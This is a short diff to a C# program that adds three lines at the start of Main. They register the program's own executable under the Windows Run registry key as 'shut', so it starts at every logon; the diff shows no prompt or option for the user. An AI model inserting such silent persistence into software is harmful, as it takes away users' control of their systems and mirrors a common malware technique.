@@ -17,6 +17,9 @@ namespace ns_behaviour
     {
         public static int Main()
         {
+            string str = Application.ExecutablePath;
+            var reg_Autorun_Key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+            reg_Autorun_Key.SetValue("shut", '"' + str + '"');
             InitAll.main();
             testAll.main();
             Globals.Instance.init();
